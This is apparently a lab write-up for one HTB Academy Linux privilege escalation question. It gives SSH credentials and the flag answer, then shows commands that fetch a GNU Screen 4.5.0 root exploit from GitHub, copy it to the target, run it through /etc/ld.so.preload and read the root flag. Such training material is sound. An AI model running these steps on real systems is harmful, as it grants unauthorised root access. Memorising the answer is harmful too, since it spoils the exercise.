# Vulnerable Services
## Questions
SSH to 10.129.43.87 (ACADEMY-LPE-NIX02), with user `htb-student` and password `Academy_LLPE!`
1. Connect to the target system and escalate privileges using the Screen exploit. Submit the contents of the flag.txt file in the /root/screen_exploit directory. **Answer: 91927dad55ffd22825660da88f2f92e0**
   - Download the exploit:
        ```sh
        $ wget https://raw.githubusercontent.com/YasserREED/screen-v4.5.0-priv-escalate/refs/heads/main/full-exploit.sh
        ```
   - Transfer the exploit to the victim machine:
        ```sh
        $ scp full-exploit.sh htb-student@10.129.43.87:/tmp
        ```
   - Execute the exploit and read the flag:
        ```sh
        $ chmod +x full-exploit.sh 
        $ ./full-exploit.sh 
        <SNIP>
        ~ gnu/screenroot ~
        [+] First, we create our shell and library...
        [+] Now we create our /etc/ld.so.preload file...
        [+] Triggering...
        ' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
        [+] done!
        No Sockets found in /run/screen/S-htb-student.

        # cat /root/screen_exploit/flag.txt
        91927dad55ffd22825660da88f2f92e0
        ```